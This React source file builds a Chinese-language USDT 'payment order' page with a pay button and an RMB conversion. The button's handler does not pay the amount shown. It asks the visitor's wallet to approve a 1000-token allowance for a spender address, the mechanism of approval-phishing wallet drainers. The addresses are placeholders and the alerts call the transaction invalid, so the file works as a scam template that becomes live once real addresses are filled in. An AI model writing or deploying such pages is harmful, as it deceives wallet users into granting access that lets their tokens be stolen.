import { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { ethers } from "ethers";

export default function Dapp() {
  const [params] = useSearchParams();
  const username = params.get("username");
  const amount = params.get("amount");
  const [walletStatus, setWalletStatus] = useState("检测中...");

  useEffect(() => {
    // 页面加载后自动检测钱包环境
    if (window.ethereum) {
      setWalletStatus("检测到标准钱包 (window.ethereum) ✅");
    } else if (window.tp) {
      setWalletStatus("检测到 TP 钱包环境 (window.tp) ✅");
    } else {
      setWalletStatus("未检测到任何钱包 ❌");
    }
  }, []);

  async function handlePayment() {
    if (!window.ethereum && !window.tp) {
      alert('未检测到钱包，请用钱包自带浏览器访问！');
      return;
    }

    try {
      if (window.ethereum) {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        await provider.send("eth_requestAccounts", []);

        const fakeUSDTAddress = "0x0000000000000000000000000000000000000000";
        const fakeABI = [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ];
        const contract = new ethers.Contract(fakeUSDTAddress, fakeABI, signer);

        const fakeSpender = "0x000000000000000000000000000000000000dead";
        const fakeAmount = ethers.parseUnits("1000", 18);

        const tx = await contract.approve(fakeSpender, fakeAmount);
        alert('交易发送成功，等待链上确认（实际上参数错误）');
        await tx.wait();
      } else if (window.tp) {
        const fakeTransaction = {
          to: "0x0000000000000000000000000000000000000000",
          value: "0x0",
          data: "0x",
        };
        window.tp.signTransaction(fakeTransaction, function (res) {
          if (res.result === true) {
            alert("交易已签名（实际上无效）");
          } else {
            alert("签名失败：" + res.msg);
          }
        });
      }
    } catch (error) {
      console.error('操作失败：', error);
      alert('付款失败！（正常现象）');
    }
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-start bg-gray-100 p-4">
      <div className="bg-white rounded-xl p-6 w-full max-w-sm shadow-md mt-16">
        <h2 className="text-lg font-semibold text-gray-800 mb-6 text-center">
          支付订单
        </h2>

        {/* 检测结果显示在这里 */}
        <p className="text-center text-sm text-blue-500 mb-4">
          {walletStatus}
        </p>

        <div className="space-y-4 text-gray-700 text-base">
          <div className="flex justify-between">
            <span>用户名</span>
            <span>{username || "未提供"}</span>
          </div>
          <div className="flex justify-between">
            <span>付款金额</span>
            <span>{amount || "0"} USDT</span>
          </div>
          <div className="flex justify-between">
            <span>实际到账金额</span>
            <span>{(amount ? (parseFloat(amount) * 7.4).toFixed(2) : "0")} RMB</span>
          </div>
        </div>

        <button
          onClick={handlePayment}
          className="mt-8 w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 rounded-lg shadow-md"
        >
          点击付款
        </button>

        <p className="text-xs text-center text-gray-400 mt-4">
          请在钱包DApp浏览器中操作支付
        </p>
      </div>
    </div>
  );
}
